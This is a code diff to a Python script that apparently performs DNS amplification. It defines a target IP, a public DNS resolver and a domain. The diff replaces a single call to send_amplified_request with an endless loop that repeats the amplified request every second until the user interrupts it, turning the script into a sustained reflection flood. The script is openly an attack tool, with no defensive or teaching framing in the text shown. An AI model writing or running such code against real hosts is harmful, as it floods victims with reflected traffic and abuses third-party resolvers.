@@ -3,6 +3,7 @@ import ipaddress
 import struct
 import logging
 import random
+import time
 
 def create_dns_query(domain):
     transaction_id = random.randint(0, 65535)
@@ -65,4 +66,12 @@ if __name__ == "__main__":
     target_ip = "192.0.2.1"
     dns_server = "8.8.8.8"
     domain = "example.com"
-    send_amplified_request(target_ip, dns_server, domain)
+    interval = 1 # seconds
+
+    try:
+        while True:
+            send_amplified_request(target_ip, dns_server, domain)
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        print("Process interrupted by user.")
+        logging.info("Process interrupted by user.")
